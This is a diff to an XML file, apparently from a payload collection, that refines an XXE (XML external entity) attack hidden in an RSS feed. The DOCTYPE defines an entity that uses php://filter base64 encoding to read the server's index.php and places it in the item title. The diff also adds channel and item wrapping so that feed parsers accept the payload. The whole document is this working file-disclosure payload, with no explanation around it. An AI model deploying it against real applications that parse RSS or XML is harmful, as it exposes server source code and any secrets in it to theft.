@@ -1,9 +1,16 @@
-<?xml  version="1.0" encoding="UTF-8"?>
+<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE rss [
-   <!ELEMENT title ANY >
-   <!ENTITY xxe SYSTEM  "php://filter/convert.base64-encode/resource=index.php" >]>
+    <!ELEMENT title ANY>
+    <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php" >
+]>
 <rss>
-   <title>&xxe;</title>
-   <description>toto</description>
-   <author>toototo</author>
+    <channel>
+        <item>
+            <title>&xxe;</title>
+            <link>http://example.com</link>
+            <description>toto</description>
+            <author>toto@example.com</author>
+            <pubDate>Londay</pubDate>
+        </item>
+    </channel>
 </rss>
